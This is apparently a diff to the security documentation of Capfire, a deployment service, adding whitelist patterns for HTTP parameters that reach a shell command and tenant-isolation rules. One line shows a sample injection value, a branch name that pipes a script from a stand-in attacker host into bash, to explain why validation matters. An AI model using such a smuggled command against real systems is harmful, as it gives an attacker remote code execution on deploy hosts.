@@ -13,6 +13,39 @@ Compromising Capfire is equivalent to compromising every app it can
 deploy. Treat the node like a production host: minimal surface,
 monitored, behind a private network.
 
+## Input validation
+
+Every HTTP parameter that ends up inside a shell command is validated at
+controller level against a whitelist pattern (in
+`app/controllers/application_controller.rb`):
+
+| Parameter | Pattern | Notes |
+|---|---|---|
+| `app` | `\A[a-zA-Z0-9][a-zA-Z0-9_-]{0,62}\z` | Project slugs only |
+| `env` | `\A[a-zA-Z0-9][a-zA-Z0-9_-]{0,31}\z` | `production`, `staging`, `qa-eu`, ... |
+| `branch` | `\A[a-zA-Z0-9][a-zA-Z0-9._/-]{0,254}\z` | Plus `..` sequences rejected explicitly |
+| `cmd` | whitelist | `restart`/`rollback`/`status` for `/commands` |
+| `status` | whitelist | Deploy::STATUSES enum only |
+
+Values that fail validation return `400 Bad Request` with a generic
+message — we never reflect the rejected value back, so an attacker
+cannot use the error payload as an oracle.
+
+This matters because the final deploy command is built by
+`sh -c "<template with %{branch} substituted>"`. A missing validation
+here would turn `branch=$(curl evil.com/sh | bash)` into RCE as the
+`capfire` user.
+
+## Tenant isolation
+
+- `GET /deploys` only returns rows where `triggered_by = sub` of the
+  current token — you never see other people's runs.
+- `GET /deploys/:id` requires the same `triggered_by` match; anything
+  else returns 404. Stops log exfiltration across users.
+- `CAPFIRE_ALLOWED_APPS` is the ultimate per-host safety net: even if
+  someone signs a token with `apps: ["*"]` against a stolen secret,
+  only the listed apps can be deployed on this node.
+
 ## Why JWT with claims
 
 Capfire tokens are not opaque strings — they are JWTs signed with
